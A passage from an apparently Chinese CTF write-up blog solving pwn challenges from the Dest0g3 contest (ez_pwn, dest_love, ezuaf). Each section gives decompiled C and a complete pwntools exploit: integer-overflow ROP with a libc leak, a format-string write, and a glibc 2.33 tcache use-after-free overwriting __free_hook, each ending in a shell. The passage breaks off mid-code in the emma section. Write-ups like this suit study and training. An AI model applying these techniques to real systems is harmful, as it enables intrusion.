class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26257</span>)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.send(<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">0x08</span>) + <span class="string">&#x27;\x3c&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="ez-pwn"><a href="#ez-pwn" class="headerlink" title="ez_pwn"></a>ez_pwn</h3><p>主要代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hackme</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1[<span class="number">10</span>]; <span class="comment">// [esp+4h] [ebp-44h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [esp+2Ch] [ebp-1Ch] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+30h] [ebp-18h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [esp+34h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [esp+38h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+3Ch] [ebp-Ch]</span></span><br><span class="line"> </span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input the length of array:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)abs32(v2) &gt; <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;array is too long!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;\n\n----------------------------------------------------&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;choice:\n1.add num\n2.get sum\n3.get avg\n4.exit&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;----------------------------------------------------\n&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;input your choice:&quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v4 )</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;avg = %d\n&quot;</span>, v6 / v4);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;no avg!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">3</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4 &gt;= v2 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;array is too long!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;input num&quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1[v4++]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v6 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; v4 &gt; i; ++i )</span><br><span class="line">        v6 += v1[i];</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;sum = %d\n&quot;</span>, v6);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;exit!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>开始的 <code>scanf</code> 处未检查输入，读入负数可致负溢出，再结合写入数据的第二个 <code>scanf</code>， 可以越栈一直写，最后利用ROP修改返回地址，第一次ROP求libc基地址，第二次ROP可getshell：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28547</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ez_pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">n</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;input your choice:&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;input num&#x27;</span>, <span class="built_in">str</span>(n))</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt.puts</span><br><span class="line">puts_got = elf.got.puts</span><br><span class="line">hackme_addr = elf.sym.hackme</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;length of array:&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-2147483648&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1000</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">17</span>)</span><br><span class="line"></span><br><span class="line">add(puts_plt)</span><br><span class="line">add(hackme_addr)</span><br><span class="line">add(puts_got)</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;input your choice:&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;exit!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u32(r.recv(<span class="number">4</span>))</span><br><span class="line">libc_base = puts_addr - <span class="number">0x67560</span></span><br><span class="line">system_addr = libc_base + <span class="number">0x3cf10</span></span><br><span class="line">binsh_addr = libc_base + <span class="number">0x17b9db</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;length of array:&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-2147483648&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1000</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">17</span>)</span><br><span class="line"></span><br><span class="line">add(signed(system_addr))</span><br><span class="line">add(hackme_addr)</span><br><span class="line">add(signed(binsh_addr))</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;input your choice:&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="dest-love"><a href="#dest-love" class="headerlink" title="dest_love"></a>dest_love</h3><p>主要代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 i; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt;= <span class="number">5</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;What about your love to Dest0g3?&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, format, <span class="number">0x40</span>uLL);</span><br><span class="line">    <span class="built_in">printf</span>(format);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( dword_4010 == <span class="number">1314520</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;I can feel your love!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Your dont love Dest0g3 at all!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>格式化字符串漏洞，需要改写值的串在bss段里。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29044</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">b&#x27;What about your love to Dest0g3?\n&#x27;</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">r.sendafter(<span class="string">b&#x27;What about your love to Dest0g3?\n&#x27;</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">b&#x27;What about your love to Dest0g3?\n&#x27;</span>,<span class="string">b&#x27;%12$p%10$p&#x27;</span>)</span><br><span class="line">base = <span class="built_in">int</span>(r.recv(<span class="number">14</span>),<span class="number">16</span>) - <span class="number">0x1185</span></span><br><span class="line">stack = <span class="built_in">int</span>(r.recv(<span class="number">14</span>),<span class="number">16</span>) - <span class="number">0xd8</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">b&#x27;What about your love to Dest0g3?\n&#x27;</span>,<span class="string">&#x27;%&#123;&#125;c%10$hn&#x27;</span>.<span class="built_in">format</span>(stack % <span class="number">0x10000</span>))</span><br><span class="line"></span><br><span class="line">target = base + <span class="number">0x4010</span></span><br><span class="line">r.sendafter(<span class="string">b&#x27;What about your love to Dest0g3?\n&#x27;</span>,<span class="string">&#x27;%&#123;&#125;c%39$hn&#x27;</span>.<span class="built_in">format</span>(target % <span class="number">0x10000</span>))</span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">b&#x27;What about your love to Dest0g3?\n&#x27;</span>,<span class="string">&#x27;%1314520c%12$n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="ezuaf"><a href="#ezuaf" class="headerlink" title="ezuaf"></a>ezuaf</h3><p>主要代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-114h]</span></span><br><span class="line"></span><br><span class="line">  sub_11C5(a1, a2, a3);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    v3 = read_n();</span><br><span class="line">    <span class="keyword">switch</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        add();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        edit();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">delete</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        show();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invaild Choice!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v0; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please tell me the index: &quot;</span>);</span><br><span class="line">  v0 = read_n();</span><br><span class="line">  <span class="keyword">if</span> ( *((_QWORD *)&amp;unk_40C0 + v0) &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v0 &lt;= <span class="number">0xF</span> )</span><br><span class="line">    <span class="built_in">free</span>(*((<span class="keyword">void</span> **)&amp;unk_40C0 + v0));</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid Index!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>高版本（2.33）的UAF漏洞利用，在tcache里写入__free_hook，再写入system。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26427</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.33.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;4. show\n: &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Please tell me its size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">&#x27;Content: &#x27;</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;4. show\n: &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Please tell me the index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    r.sendafter(<span class="string">&#x27;Please tell me its content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;4. show\n: &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Please tell me the index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;4. show\n: &#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Please tell me the index: \n&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x7f</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x1e0c00</span></span><br><span class="line"><span class="comment">#print(hex(libc_base))</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">heap_addr1 = ((u64(r.recv(<span class="number">8</span>)) &lt;&lt; <span class="number">12</span>) % (<span class="number">2</span>**<span class="number">64</span>)) + <span class="number">0x380</span></span><br><span class="line"><span class="comment">#print(hex(heap_addr1))</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">free_hook = libc_base + libc.sym.__free_hook</span><br><span class="line"><span class="comment">#print(hex(free_hook))</span></span><br><span class="line">heap_addr2 = (((u64(r.recv(<span class="number">8</span>)) ^ heap_addr1) &lt;&lt; <span class="number">12</span>) % (<span class="number">2</span>**<span class="number">64</span>)) + <span class="number">0x330</span></span><br><span class="line"><span class="comment">#print(hex(heap_addr2))</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">next</span> = ((heap_addr2 &gt;&gt; <span class="number">12</span>) % (<span class="number">2</span>**<span class="number">64</span>)) ^ free_hook</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="built_in">next</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.sym.system</span><br><span class="line"><span class="comment">#print(hex(system_addr))</span></span><br><span class="line">add(<span class="number">0x40</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="emma"><a href="#emma" class="headerlink" title="emma"></a>emma</h3><p>主要代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  init_0();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      read_n();</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">4</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">delete</span>(a1, a2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_12:</span><br><span class="line">      a1 = <span class="string">&quot;Invaild Choice!&quot;</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invaild Choice!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> ( v3 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">          show(a1, a2);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">          add(a1, a2);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">          edit(a1, a2);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  